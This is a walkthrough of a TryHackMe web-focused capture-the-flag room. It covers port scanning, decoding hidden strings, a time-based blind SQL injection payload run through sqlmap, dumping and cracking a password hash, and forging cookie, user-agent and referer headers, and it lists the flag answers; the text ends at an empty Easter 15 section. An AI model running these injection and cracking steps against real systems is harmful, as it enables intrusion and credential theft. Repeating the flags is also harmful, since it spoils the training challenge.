# CTF collection Vol.2

Sharpening up your CTF skill with the collection. The second volume is about web-based CTF.

[CTF collection Vol.2](https://tryhackme.com/room/ctfcollectionvol2)

## Topic's

- Network Enumeration
- Web Enumeration
- Web Poking
- Cryptography
  - Hex
  - urldecode
  - Base64
- SQL Enumeration
- Brute Forcing Hash
- Web Cookie Manipulation
- Web Header Manipulation
- Python Scripting (Decoder)
- Reverse Engineering

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Author note

Welcome, welcome and welcome to another CTF collection. This is the second installment of the CTF collection series. For your information, the second serious focuses on the web-based challenge. There are a total of 20 easter eggs a.k.a flags can be found within the box. Let see how good is your CTF skill.

Now, deploy the machine and collect the eggs!

Warning: The challenge contains seizure images and background. If you feeling uncomfortable, try removing the background on <style> tag.

Note: All the challenges flag are formatted as THM{flag}, unless stated otherwise

1. Fact: Eggs contain the highest quality protein you can buy.

`No answer needed`

## Task 2 Easter egg

Submit all your easter egg right here. Gonna find it all!

```
kali@kali:~/CTFs/tryhackme/CTF collection Vol.2$ sudo nmap -p- -sS -sC -sV -O 10.10.219.170
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-08 21:32 CEST
Nmap scan report for 10.10.219.170
Host is up (0.034s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 1b:c2:b6:2d:fb:32:cc:11:68:61:ab:31:5b:45:5c:f4 (DSA)
|   2048 8d:88:65:9d:31:ff:b4:62:f9:28:f2:7d:42:07:89:58 (RSA)
|_  256 40:2e:b0:ed:2a:5a:9d:83:6a:6e:59:31:db:09:4c:cb (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/VlNCcElFSWdTQ0JKSUVZZ1dTQm5JR1VnYVNCQ0lGUWdTU0JFSUVrZ1p5QldJR2tnUWlCNklFa2dSaUJuSUdjZ1RTQjVJRUlnVHlCSklFY2dkeUJuSUZjZ1V5QkJJSG9nU1NCRklHOGdaeUJpSUVNZ1FpQnJJRWtnUlNCWklHY2dUeUJUSUVJZ2NDQkpJRVlnYXlCbklGY2dReUJDSUU4Z1NTQkhJSGNnUFElM0QlM0Q=
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: 360 No Scope!
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/8%OT=22%CT=1%CU=43200%PV=Y%DS=2%DC=I%G=Y%TM=5F7F698
OS:1%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST1
OS:1NW6%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN
OS:(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.01 seconds
```

1. Easter 1

[http://10.10.219.170/robots.txt](http://10.10.219.170/robots.txt)

```
User-agent: * (I don't think this is entirely true, DesKel just wanna to play himself)
Disallow: /VlNCcElFSWdTQ0JKSUVZZ1dTQm5JR1VnYVNCQ0lGUWdTU0JFSUVrZ1p5QldJR2tnUWlCNklFa2dSaUJuSUdjZ1RTQjVJRUlnVHlCSklFY2dkeUJuSUZjZ1V5QkJJSG9nU1NCRklHOGdaeUJpSUVNZ1FpQnJJRWtnUlNCWklHY2dUeUJUSUVJZ2NDQkpJRVlnYXlCbklGY2dReUJDSUU4Z1NTQkhJSGNnUFElM0QlM0Q=


45 61 73 74 65 72 20 31 3a 20 54 48 4d 7b 34 75 37 30 62 30 37 5f 72 30 6c 6c 5f 30 75 37 7d
```

```
kali@kali:~/CTFs/tryhackme/CTF collection Vol.2$ echo "45 61 73 74 65 72 20 31 3a 20 54 48 4d 7b 34 75 37 30 62 30 37 5f 72 30 6c 6c 5f 30 75 37 7d" | xxd -r -p
Easter 1: THM{4u70b07_r0ll_0u7}
```

`THM{4u70b07_r0ll_0u7}`

2. Easter 2

```
kali@kali:~/CTFs/tryhackme/CTF collection Vol.2$ urldecode $(echo "VlNCcElFSWdTQ0JKSUVZZ1dTQm5JR1VnYVNCQ0lGUWdTU0JFSUVrZ1p5QldJR2tnUWlCNklFa2dSaUJuSUdjZ1RTQjVJRUlnVHlCSklFY2dkeUJuSUZjZ1V5QkJJSG9nU1NCRklHOGdaeUJpSUVNZ1FpQnJJRWtnUlNCWklHY2dUeUJUSUVJZ2NDQkpJRVlnYXlCbklGY2dReUJDSUU4Z1NTQkhJSGNnUFElM0QlM0Q=" | base64 -d) | base64 -d | sed "s/\ //g" | base64 -d | sed "s/\ //g" | base64 -d
DesKel_secret_base
```

[http://10.10.219.170/DesKel_secret_base/](http://10.10.219.170/DesKel_secret_base/)

```html
<html>
  <head>
    <title>A slow clap for you</title>
    <h1 style="text-align:center;">A slow clap for you</h1>
  </head>

  <body>
    <p style="text-align:center;"><img src="kim.png" /></p>
    <p style="text-align:center;">Not bad, not bad.... papa give you a clap</p>
    <p style="text-align:center;color:white;">Easter 2: THM{f4ll3n_b453}</p>
  </body>
</html>
```

`THM{f4ll3n_b453}`

4. Easter 3

[http://10.10.219.170/login/](http://10.10.219.170/login/)

```html
<!DOCTYPE html PUBLIC"-//W3C//DTD XHTML 1.0 Strict//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"
<html>

	<head>
		<meta content="text/html;charset=utf-8" http-equiv="Content-Type">
		<meta content="utf-8" http-equiv="encoding">
		<p hidden>Seriously! You think the php script inside the source code? Pfff.. take this easter 3: THM{y0u_c4n'7_533_m3}</p>
		<title>Can you find the egg?</title>
		<h1>Just an ordinary login form!</h1>
	</head>

	<body>

		<p>You don't need to register yourself</p><br><br>
		<form method='POST'>
			Username:<br>
			<input type="text" name="username" required>
			<br><br>
			Password:<br>
			<input type="text" name="password" required>
			<br><br>
			<button name="submit" value="submit">Login</button>
		</form>

			</body>
</html>
```

`THM{y0u_c4n'7_533_m3}`

6. Easter 4

```
kali@kali:~/CTFs/tryhackme/CTF collection Vol.2$ /usr/share/sqlmap/sqlmap.py -r login.xml --current-db
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.4.9#stable}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:46:22 /2020-10-08/

[21:46:22] [INFO] parsing HTTP request from 'login.xml'
[21:46:22] [INFO] testing connection to the target URL
[21:46:23] [INFO] checking if the target is protected by some kind of WAF/IPS
[21:46:23] [INFO] testing if the target URL content is stable
[21:46:23] [INFO] target URL content is stable
[21:46:23] [INFO] testing if POST parameter 'username' is dynamic
[21:46:23] [WARNING] POST parameter 'username' does not appear to be dynamic
[21:46:23] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[21:46:23] [INFO] testing for SQL injection on POST parameter 'username'
[21:46:23] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[21:46:24] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[21:46:24] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[21:46:24] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[21:46:24] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[21:46:25] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[21:46:25] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[21:46:25] [INFO] testing 'Generic inline queries'
[21:46:25] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[21:46:25] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[21:46:25] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[21:46:26] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[21:46:36] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]
[21:46:48] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[21:46:48] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[21:46:50] [INFO] target URL appears to be UNION injectable with 2 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n]
[21:46:55] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql')
[21:46:55] [INFO] checking if the injection point on POST parameter 'username' is a false positive
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
[21:47:42] [INFO] testing if POST parameter 'password' is dynamic
[21:47:42] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
[21:47:42] [WARNING] POST parameter 'password' does not appear to be dynamic
[21:47:42] [WARNING] heuristic (basic) test shows that POST parameter 'password' might not be injectable
[21:47:42] [INFO] testing for SQL injection on POST parameter 'password'
[21:47:43] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[21:47:43] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[21:47:43] [INFO] testing 'Generic inline queries'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n]
[21:47:51] [INFO] testing 'Generic UNION query (94) - 1 to 10 columns'
[21:47:52] [WARNING] POST parameter 'password' does not seem to be injectable
[21:47:52] [INFO] testing if POST parameter 'submit' is dynamic
[21:47:52] [WARNING] POST parameter 'submit' does not appear to be dynamic
[21:47:52] [WARNING] heuristic (basic) test shows that POST parameter 'submit' might not be injectable
[21:47:52] [INFO] testing for SQL injection on POST parameter 'submit'
[21:47:52] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[21:47:52] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[21:47:52] [INFO] testing 'Generic inline queries'
[21:47:52] [INFO] testing 'Generic UNION query (94) - 1 to 10 columns'
[21:47:53] [WARNING] POST parameter 'submit' does not seem to be injectable
sqlmap identified the following injection point(s) with a total of 129 HTTP(s) requests:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=test' AND (SELECT 3521 FROM (SELECT(SLEEP(5)))SZlF) AND 'NJpu'='NJpu&password=test&submit=submit
---
[21:47:53] [INFO] the back-end DBMS is MySQL
[21:47:53] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
back-end DBMS: MySQL >= 5.0.12
[21:47:53] [INFO] fetching current database
[21:47:53] [INFO] retrieved:
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n]
[21:48:14] [INFO] adjusting time delay to 1 second due to good response times
THM_f0und_m3
current database: 'THM_f0und_m3'
[21:49:10] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.219.170'

[*] ending @ 21:49:10 /2020-10-08/

kali@kali:~/CTFs/tryhackme/CTF collection Vol.2$ /usr/share/sqlmap/sqlmap.py -r login.xml -D THM_f0und_m3 --tables
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.4.9#stable}
|_ -| . [,]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:50:12 /2020-10-08/

[21:50:12] [INFO] parsing HTTP request from 'login.xml'
[21:50:13] [INFO] resuming back-end DBMS 'mysql'
[21:50:13] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=test' AND (SELECT 3521 FROM (SELECT(SLEEP(5)))SZlF) AND 'NJpu'='NJpu&password=test&submit=submit
---
[21:50:13] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[21:50:13] [INFO] fetching tables for database: 'THM_f0und_m3'
[21:50:13] [INFO] fetching number of tables for database 'THM_f0und_m3'
[21:50:13] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
[21:50:15] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n]
2
[21:50:32] [INFO] retrieved:
[21:50:37] [INFO] adjusting time delay to 1 second due to good response times
nothing_inside
[21:51:30] [INFO] retrieved: user
Database: THM_f0und_m3
[2 tables]
+----------------+
| user           |
| nothing_inside |
+----------------+

[21:51:44] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.219.170'

[*] ending @ 21:51:44 /2020-10-08/

kali@kali:~/CTFs/tryhackme/CTF collection Vol.2$ /usr/share/sqlmap/sqlmap.py -r login.xml -D THM_f0und_m3 -T nothing_inside --columns
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.4.9#stable}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:52:04 /2020-10-08/

[21:52:04] [INFO] parsing HTTP request from 'login.xml'
[21:52:04] [INFO] resuming back-end DBMS 'mysql'
[21:52:04] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=test' AND (SELECT 3521 FROM (SELECT(SLEEP(5)))SZlF) AND 'NJpu'='NJpu&password=test&submit=submit
---
[21:52:04] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[21:52:04] [INFO] fetching columns for table 'nothing_inside' in database 'THM_f0und_m3'
[21:52:04] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
[21:52:06] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n]
1
[21:52:27] [INFO] retrieved:
[21:52:37] [INFO] adjusting time delay to 1 second due to good response times
Easter_4
[21:53:04] [INFO] retrieved: varchar(30)
Database: THM_f0und_m3
Table: nothing_inside
[1 column]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| Easter_4 | varchar(30) |
+----------+-------------+

[21:53:41] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.219.170'

[*] ending @ 21:53:41 /2020-10-08/

kali@kali:~/CTFs/tryhackme/CTF collection Vol.2$ /usr/share/sqlmap/sqlmap.py -r login.xml -D THM_f0und_m3 -T nothing_inside -C Easter_4 --sql-query "select Easter_4 from nothing_inside"
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.4.9#stable}
|_ -| . [)]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:54:10 /2020-10-08/

[21:54:10] [INFO] parsing HTTP request from 'login.xml'
[21:54:11] [INFO] resuming back-end DBMS 'mysql'
[21:54:11] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=test' AND (SELECT 3521 FROM (SELECT(SLEEP(5)))SZlF) AND 'NJpu'='NJpu&password=test&submit=submit
---
[21:54:11] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[21:54:11] [INFO] fetching SQL SELECT statement query output: 'select Easter_4 from nothing_inside'
[21:54:11] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
[21:54:13] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n]
1
[21:54:20] [INFO] retrieved:
[21:54:30] [INFO] adjusting time delay to 1 second due to good response times
THM{1nj3c7_l1k3_4_b055}
select Easter_4 from nothing_inside [1]:
[*] THM{1nj3c7_l1k3_4_b055}

[21:56:04] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.219.170'

[*] ending @ 21:56:04 /2020-10-08/

kali@kali:~/CTFs/tryhackme/CTF collection Vol.2$
```

`THM{1nj3c7_l1k3_4_b055}`

7. Easter 5

```
kali@kali:~/CTFs/tryhackme/CTF collection Vol.2$ /usr/share/sqlmap/sqlmap.py -r login.xml -D THM_f0und_m3 -T user --columns
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.4.9#stable}
|_ -| . [,]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:57:23 /2020-10-08/

[21:57:23] [INFO] parsing HTTP request from 'login.xml'
[21:57:24] [INFO] resuming back-end DBMS 'mysql'
[21:57:24] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=test' AND (SELECT 3521 FROM (SELECT(SLEEP(5)))SZlF) AND 'NJpu'='NJpu&password=test&submit=submit
---
[21:57:24] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[21:57:24] [INFO] fetching columns for table 'user' in database 'THM_f0und_m3'
[21:57:24] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
[21:57:26] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n]
2
[21:57:39] [INFO] retrieved:
[21:57:44] [INFO] adjusting time delay to 1 second due to good response times
username
[21:58:08] [INFO] retrieved: varchar(30)
[21:58:45] [INFO] retrieved: password
[21:59:15] [INFO] retrieved: varchar(40)
Database: THM_f0und_m3
Table: user
[2 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| password | varchar(40) |
| username | varchar(30) |
+----------+-------------+

[21:59:53] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.219.170'

[*] ending @ 21:59:53 /2020-10-08/

kali@kali:~/CTFs/tryhackme/CTF collection Vol.2$ /usr/share/sqlmap/sqlmap.py -r login.xml -D THM_f0und_m3 -T user -C username,password --sql-query "select username,password from user"
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.4.9#stable}
|_ -| . ["]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 22:00:18 /2020-10-08/

[22:00:18] [INFO] parsing HTTP request from 'login.xml'
[22:00:18] [INFO] resuming back-end DBMS 'mysql'
[22:00:18] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=test' AND (SELECT 3521 FROM (SELECT(SLEEP(5)))SZlF) AND 'NJpu'='NJpu&password=test&submit=submit
---
[22:00:19] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[22:00:19] [INFO] fetching SQL SELECT statement query output: 'select username,password from user'
[22:00:19] [INFO] the SQL query provided has more than one field. sqlmap will now unpack it into distinct queries to be able to retrieve the output even if we are going blind
[22:00:19] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
[22:00:21] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n]
2
the SQL query provided can return 2 entries. How many entries do you want to retrieve?
[a] All (default)
[#] Specific number
[q] Quit
> a
[22:00:54] [INFO] retrieved:
[22:00:59] [INFO] adjusting time delay to 1 second due to good response times
DesKel
[22:01:20] [INFO] retrieved: 05f3672ba34409136aa71b8d00070d1b
[22:03:08] [INFO] retrieved: Skidy
[22:03:25] [INFO] retrieved: He is a nice guy, say hello for me
select username,password from user [2]:
[*] DesKel, 05f3672ba34409136aa71b8d00070d1b
[*] Skidy, He is a nice guy, say hello for me

[22:05:38] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.219.170'

[*] ending @ 22:05:38 /2020-10-08/

kali@kali:~/CTFs/tryhackme/CTF collection Vol.2$ hashcat -m 0 05f3672ba34409136aa71b8d00070d1b /usr/share/wordlists/rockyou.txt --force
hashcat (v5.1.0) starting...

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

05f3672ba34409136aa71b8d00070d1b:cutie

Session..........: hashcat
Status...........: Cracked
Hash.Type........: MD5
Hash.Target......: 05f3672ba34409136aa71b8d00070d1b
Time.Started.....: Thu Oct  8 22:06:29 2020 (1 sec)
Time.Estimated...: Thu Oct  8 22:06:30 2020 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     7163 H/s (0.88ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 2048/14344385 (0.01%)
Rejected.........: 0/2048 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: 123456 -> lovers1

Started: Thu Oct  8 22:06:23 2020
Stopped: Thu Oct  8 22:06:30 2020
kali@kali:~/CTFs/tryhackme/CTF collection Vol.2$ curl -s -d "username=DesKel&password=cutie&submit=submit" -X POST http://10.10.219.170/login/ | grep Easter
Easter 5: THM{wh47_d1d_17_c057_70_cr4ck_7h3_5ql}        </body>
```

`THM{wh47_d1d_17_c057_70_cr4ck_7h3_5ql}`

8. Easter 6

```
kali@kali:~/CTFs/tryhackme/CTF collection Vol.2$ curl -s 10.10.219.170 -D header.txt

kali@kali:~/CTFs/tryhackme/CTF collection Vol.2$ cat header.txt
HTTP/1.1 200 OK
Date: Thu, 08 Oct 2020 20:08:44 GMT
Server: Apache/2.2.22 (Ubuntu)
X-Powered-By: PHP/5.3.10-1ubuntu3.26
Busted: Hey, you found me, take this Easter 6: THM{l37'5_p4r7y_h4rd}
Set-Cookie: Invited=0
Vary: Accept-Encoding
Transfer-Encoding: chunked
Content-Type: text/html
```

`THM{l37'5_p4r7y_h4rd}`

9. Easter 7

```
kali@kali:~/CTFs/tryhackme/CTF collection Vol.2$ curl -s --cookie "Invited=1" http://10.10.219.170/ | grep "easter 7"
                        <h2> You are now officially invited. Enjoy the easter 7: THM{w3lc0m3!_4nd_w3lc0m3} </h2>
```

`THM{w3lc0m3!_4nd_w3lc0m3}`

10. Easter 8

```
kali@kali:~/CTFs/tryhackme/CTF collection Vol.2$ curl -s http://10.10.219.170/ | grep "Safari"
                        <h4>You need Safari 13 on iOS 13.1.2 to view this message. If you are rich enough</h4>
kali@kali:~/CTFs/tryhackme/CTF collection Vol.2$ curl -s --user-agent "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" http://10.10.219.170/ | grep "Easter 8"
                        <h4>You are Rich! Subscribe to THM server ^^ now. Oh btw, Easter 8: THM{h3y_r1ch3r_wh3r3_15_my_k1dn3y}
kali@kali:~/CTFs/tryhackme/CTF collection Vol.2$
```

`THM{h3y_r1ch3r_wh3r3_15_my_k1dn3y}`

12. Easter 9

```
kali@kali:~/CTFs/tryhackme/CTF collection Vol.2$ curl -s http://10.10.219.170/ready/
<html>
        <head>
                <title>You just press it</title>
                <meta http-equiv="refresh" content="3;url=http:gone.php" />
                <p style="text-align:center"><img src="bye.gif"/></p>
                <!-- Too fast, too good, you can't catch me. I'm sanic Easter 9: THM{60nn4_60_f457} -->
        </head>

</html>
```

`THM{60nn4_60_f457}`

13. Easter 10

```
kali@kali:~/CTFs/tryhackme/CTF collection Vol.2$ curl -s http://10.10.219.170/free_sub/
only people came from tryhackme are allowed to claim the voucher.

kali@kali:~/CTFs/tryhackme/CTF collection Vol.2$ curl -s --referer "tryhackme.com" http://10.10.219.170/free_sub/
Nah, there are no voucher here, I'm too poor to buy a new one XD. But i got an egg for you. Easter 10: THM{50rry_dud3}
```

14. Easter 11

```
kali@kali:~/CTFs/tryhackme/CTF collection Vol.2$ curl -s http://10.10.219.170/ | grep menu -B 1 -A 10
        <img src="dinner.gif"/>
        <h2>Let see the menu, huh..............</h2>
        <form method="POST">
        <select name="dinner">
                 <option value="salad">salad</option>
                 <option value="chicken sandwich">chicken sandwich</option>
                 <option value="tyre">tyre</option>
                 <option value="DesKel">DesKel</option>
        </select>
         <br><br><br>
                 <button name="submit" value="submit">Take it!</button>
        </form>
kali@kali:~/CTFs/tryhackme/CTF collection Vol.2$ curl -s -d "dinner=salad" -X POST http://10.10.219.170/ | grep menu -B 1 -A 12
        <img src="dinner.gif"/>
        <h2>Let see the menu, huh..............</h2>
        <form method="POST">
        <select name="dinner">
                 <option value="salad">salad</option>
                 <option value="chicken sandwich">chicken sandwich</option>
                 <option value="tyre">tyre</option>
                 <option value="DesKel">DesKel</option>
        </select>
         <br><br><br>
                 <button name="submit" value="submit">Take it!</button>
        </form>

        Mmmmmm... what a healthy choice, I prefer an egg        <h1 style="color:red"">Press this button if you wishes to watch the world burn!!!!!!!!!!!!!!!!<h1>
kali@kali:~/CTFs/tryhackme/CTF collection Vol.2$ curl -s -d "dinner=egg" -X POST http://10.10.219.170/ | grep menu -B 1
        <img src="dinner.gif"/>
        <h2>Let see the menu, huh..............</h2>
--

        You found the secret menu, take the easter 11: THM{366y_b4k3y}  <h1 style="color:red"">Press this button if you wishes to watch the world burn!!!!!!!!!!!!!!!!<h1>
```

`THM{366y_b4k3y}`

16. Easter 12

```
kali@kali:~/CTFs/tryhackme/CTF collection Vol.2$ curl -s http://10.10.219.170/jquery-9.1.2.js
function ahem()
 {
        str1 = '4561737465722031322069732054484d7b68316464336e5f6a355f66316c337d'
        var hex  = str1.toString();
        var str = '';
        for (var n = 0; n < hex.length; n += 2) {
                str += String.fromCharCode(parseInt(hex.substr(n, 2), 16));
        }
        return str;
 }
```

`Easter 12 is THM{h1dd3n_j5_f1l3}`

`THM{h1dd3n_j5_f1l3}`

17. Easter 13

```
kali@kali:~/CTFs/tryhackme/CTF collection Vol.2$ curl -s http://10.10.219.170/ready/gone.php
<html>
                <title>Congratulation</title>
                <h1 style="text-align:center">Congratulation!You just ended the world</h1>
                <p style="text-align:center"><img src="bomb.gif"></p><br><br>
                <p style="text-align:center">Happy? Take the egg now. Easter 13: THM{1_c4n'7_b3l13v3_17}</p>
</html>
```

`THM{1_c4n'7_b3l13v3_17}`

19. Easter 14

```
<h2>Did you know: During your lifetime, you will produce enough saliva to fill two swimming pools.</h2>
	<!--Easter 14<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAiizQXzAvG0AAAAASUVORK5CYII="/> -->
```

[https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)Render_Image('Raw')](<https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)Render_Image('Raw')>)

`THM{d1r3c7_3mb3d}`

20. Easter 15

```
